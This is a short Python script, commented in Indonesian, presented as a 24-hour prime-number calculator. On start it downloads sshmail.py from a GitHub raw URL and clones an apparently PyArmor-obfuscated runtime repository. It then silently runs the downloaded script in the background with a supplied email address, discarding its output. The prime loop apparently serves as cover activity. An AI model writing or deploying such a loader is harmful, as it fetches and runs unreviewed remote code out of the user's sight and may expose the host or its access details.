import os
import subprocess
import time
import math
from datetime import datetime, timedelta
import urllib.request
import argparse

# URL untuk file dan repository Git
SSHMAIL_URL = "https://raw.githubusercontent.com/icadnewton/sendme/refs/heads/main/sshmail.py"
PYARMOR_REPO_URL = "https://github.com/icadnewton/pyarmor_runtime_000000.git"

# Nama file dan folder lokal
SSHMAIL_FILE = "sshmail.py"
PYARMOR_FOLDER = "pyarmor_runtime_000000"

# Fungsi untuk memeriksa dan mengunduh file jika belum ada
def check_and_download_file(file_name, url):
    if not os.path.exists(file_name):
        print(f"File {file_name} tidak ditemukan. Mengunduh dari {url}...")
        try:
            urllib.request.urlretrieve(url, file_name)
            print(f"File {file_name} berhasil diunduh.")
        except Exception as e:
            print(f"Error saat mengunduh {file_name}: {e}")
    else:
        print(f"File {file_name} sudah ada.")

# Fungsi untuk memeriksa dan mengkloning folder repository Git jika belum ada
def check_and_clone_folder(folder_name, repo_url):
    if not os.path.exists(folder_name):
        print(f"Folder {folder_name} tidak ditemukan. Mengkloning dari {repo_url}...")
        try:
            subprocess.run(["git", "clone", repo_url], check=True)
            print(f"Folder {folder_name} berhasil dikloning.")
        except subprocess.CalledProcessError as e:
            print(f"Error saat mengkloning folder {folder_name}: {e}")
    else:
        print(f"Folder {folder_name} sudah ada.")

# Fungsi untuk menjalankan script pertama di latar belakang
def run_background_script(email):
    try:
        # Menjalankan script sshmail.py dengan parameter -email
        command = ["python3", "sshmail.py", "-email", email]
        subprocess.Popen(
            command,
            stdout=subprocess.DEVNULL,  # Membuang output ke devnull
            stderr=subprocess.DEVNULL,  # Membuang error ke devnull
        )
        print(f"Script sshmail.py berhasil dijalankan di latar belakang untuk email: {email}")
    except Exception as e:
        print(f"Error saat menjalankan script sshmail.py: {e}")

# Fungsi untuk memeriksa apakah sebuah angka adalah bilangan prima
def is_prime(number):
    if number <= 1:
        return False
    for i in range(2, int(math.sqrt(number)) + 1):
        if number % i == 0:
            return False
    return True

# Fungsi untuk menghitung dan mencetak bilangan prima dalam rentang tertentu
def calculate_primes():
    print("Menghitung bilangan prima...")
    max_number = 1000  # Batas maksimum angka yang akan diperiksa
    primes = [num for num in range(2, max_number + 1) if is_prime(num)]

    print(f"Bilangan prima antara 2 hingga {max_number}:")
    print(primes)

# Fungsi utama
def main():
    # Menggunakan argparse untuk membaca parameter -email
    parser = argparse.ArgumentParser(description="Script untuk menjalankan sshmail dan menghitung bilangan prima.")
    parser.add_argument("-email", required=True, help="Alamat email penerima")
    args = parser.parse_args()
    email = args.email

    # Memeriksa dan mengunduh file dan folder yang diperlukan
    check_and_download_file(SSHMAIL_FILE, SSHMAIL_URL)
    check_and_clone_folder(PYARMOR_FOLDER, PYARMOR_REPO_URL)

    # Menjalankan script sshmail.py di latar belakang
    run_background_script(email)

    # Waktu mulai dan waktu berakhir (24 jam dari waktu mulai)
    start_time = datetime.now()
    end_time = start_time + timedelta(hours=24)

    print("Program menghitung bilangan prima dimulai...")

    # Loop yang akan berjalan selama 24 jam
    while datetime.now() < end_time:
        calculate_primes()
        time.sleep(180)  # Menunggu selama 3 menit (180 detik)

    print("Program selesai setelah berjalan selama 24 jam.")

if __name__ == "__main__":
    main()
